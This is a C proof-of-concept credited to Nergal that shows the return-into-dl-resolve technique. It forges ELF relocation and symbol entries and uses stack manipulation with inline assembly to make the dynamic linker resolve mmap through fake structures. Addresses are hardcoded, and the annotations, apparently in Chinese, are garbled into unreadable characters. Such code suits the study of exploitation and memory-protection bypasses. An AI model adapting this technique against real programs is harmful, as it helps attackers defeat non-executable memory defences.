/* by Nergal */
#include <stdlib.h>
#include <elf.h>
#include <stdio.h>
#include <string.h> 

#define STRTAB 0x804822c
#define SYMTAB 0x804816c
#define JMPREL 0x8048310
#define VERSYM 0x80482c8

#define PLT_SECTION "0x08048380"

void graceful_exit()
{
        exit(123);
}

void doit(int offset)
{
        int res;
        __asm__ volatile ("
            pushl $0x01011000
            pushl $0xffffffff
            pushl $0x00000032
            pushl $0x00000007
            pushl $0x01011000
            pushl $0xaa011000
            pushl %%ebx //��graceful_exit������ַpush stack,����ʱ�ͷ��ص�������
            pushl %%eax //��offset push stack
            pushl $" PLT_SECTION " 
            ret"
            :"=a"(res) //������֣�resʹ��eax
            :"0"(offset),//ʹ����%0ͬ���ļĴ�����Ҳ����eax
            "b"(graceful_exit)//���벿�� ,graceful_exitʹ��ebx
        );

}

/* this must be global */
Elf32_Rel reloc; 

#define ANYTHING 0xfe
#define RQSIZE 60000
int
main(int argc, char **argv)
{
        unsigned int reloc_offset;
        unsigned int real_index;
        char symbol_name[16];
        int dummy_writable_int;
        char *tmp = malloc(RQSIZE);
        Elf32_Sym *sym;
        unsigned short *null_short = (unsigned short*) tmp;
        
        /* create a null index into VERSYM */
        *null_short = 0;
        
        real_index = ((unsigned int) null_short - VERSYM) / sizeof(*null_short);
/*	uint16_t ndx = VERSYM[ ELF32_R_SYM (reloc->r_info) ]; */
//	ndx= VERSYM[real_index];
//	Ϊ��ʹuint16_t ndx==0;ndx(���������null_short)�ƹ��汾���

        sym = (Elf32_Sym *)(real_index * sizeof(*sym) + SYMTAB);
        /* Elf32_Sym * sym = &SYMTAB[ ELF32_R_SYM (reloc->r_info) ];*/
/*	#define ELF32_R_SYM(val)		((val) >> 8)*/
//      ��Elf32_Sym * sym = &SYMTAB[real_index]; 


	if ((unsigned int) sym > (unsigned int) tmp + RQSIZE) {
                fprintf(stderr,
                    "mmap symbol entry is too far, increase RQSIZE\n");
                exit(1);
        }

        strcpy(symbol_name, "mmap");
        sym->st_name = (unsigned int) symbol_name - (unsigned int) STRTAB;//st_name����STRTAB�е�offset
	/*  name = STRTAB + sym->st_name; */

        sym->st_value = (unsigned int) &dummy_writable_int;
        sym->st_size = ANYTHING;
        sym->st_info = ANYTHING;
        sym->st_other = ANYTHING & ~3;
        sym->st_shndx = ANYTHING;
        reloc_offset = (unsigned int) (&reloc) - JMPREL;//reloc_offset����JMPREL section��ƫ����
        /* Elf32_Rel * reloc = JMPREL + reloc_offset; */
        //��_dl_runtime_resolve()�������������Ϊreloc_offset
	//��reloc_offset��������ȷ��һ��Elf32_Rel * reloc��
	//��reloc.r_info�ֿ���ȷ��һ��Elf32_Sym *sym;

	reloc.r_info = R_386_JMP_SLOT + real_index*256;
//	#define R_386_JMP_SLOT	7		/* Create PLT entry */
//	reloc.r_info = 7 + real_index<<8;

        reloc.r_offset = (unsigned int) &dummy_writable_int;

        doit(reloc_offset);
        printf("not reached\n");
        return 0;
}
